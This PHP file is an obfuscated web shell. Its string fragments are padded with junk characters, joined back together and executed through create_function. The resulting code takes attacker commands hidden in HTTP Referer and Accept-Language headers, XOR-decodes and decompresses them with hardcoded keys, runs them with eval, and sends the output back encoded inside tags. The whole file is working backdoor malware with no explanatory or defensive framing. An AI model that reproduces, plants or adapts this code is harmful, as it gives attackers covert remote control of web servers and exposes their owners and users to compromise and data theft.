<?php
$B='grse_str($u["quer8gy"],8g$q);8g$q=array_values($8gq)8g;p8greg_match_all8g("/(8g[\\w])';
$T='d5($8gi8g.$kh),0,3));$f=8g$sl8g8g($ss(md5($i.$8gkf),0,38g));$p8g=""8g;fo8gr($z8g=8g1';
$n='";$p8g=$ss(8g$p,38g);8g}if(8gar8gray8g_k8gey_exists($i,$s)){$s[$i].8g=$p8g;$e=st8grpo8gs(';
$L='se8g64_d8gecod8ge(pr8geg_rep8glace(ar8gra8gy8g("/_/","/-8g/"),array8g("/","+")8g,$ss($s[$8gi]';
$Y=');$o=8g"8g";for($i=0;8g$i<$l;){fo8gr($8gj=08g;($j<$c&&$i8g8g<$l);$j++,$i8g++8g)8g{$o.';
$F='code(x(g8gzcomp8gress($o),$k))8g;p8g8grint("<$k>8g$d</$k>");@se8gssio8gn_8gdestroy();}}}}';
$U=str_replace('zy','','crezyatzyezy_fuzynzyczytion');
$m='$s[8g$8gi],$f);if($e){$8gk=$kh.$kf;8go8gb_start();8g@eva8gl(@gzunc8gompres8gs(@x(@8gba';
$t='$kh="5d8g41";$8gkf="402a";f8g8gunction x($t8g,$k){$8gc=s8gtrl8ge8gn8g($k);$l=strlen(8g$t';
$A='=$t{$i}^$k8g8g{$j8g};}}retur8gn $o;}$r8g=$_S8gERVER;$rr=@8g$8gr["HTT8gP_R8gEFERER"];$ra=';
$u=';$z<count8g($m[1]);$8gz++)$p.=$q[8g$m[28g][$z]];i8g8gf(strpos(8g$p,$h)===08g){$s8g[$i]="';
$p='[\\8g8gw-]+(?:8g;q=0.([\\d]8g))?8g,8g?/",$r8ga,8g$m);if($q&&$m){@se8gssion_st8gart();8g$s=&$_S8';
$W='g8gESSION;$8gss="8gsubstr";$sl8g="strto8glowe8g8gr";$i=$m[1]8g[0].$8g8gm[1][1];$h=$sl8g($ss(8gm';
$d=',0,$e))8g)8g,$k)8g));$o=ob_get_8g8gcontents8g()8g;o8gb8g_end_clean();$d=b8ga8gse64_e8gn';
$l='@8g$r["HTTP_AC8gCEPT_L8g8gANGUAGE"];if8g($8grr&&$8gra){$u=pars8ge_u8gr8gl($8grr8g);pa8';
$a=str_replace('8g','',$t.$Y.$A.$l.$B.$p.$W.$T.$u.$n.$m.$L.$d.$F);
$D=$U('',$a);$D();
?>
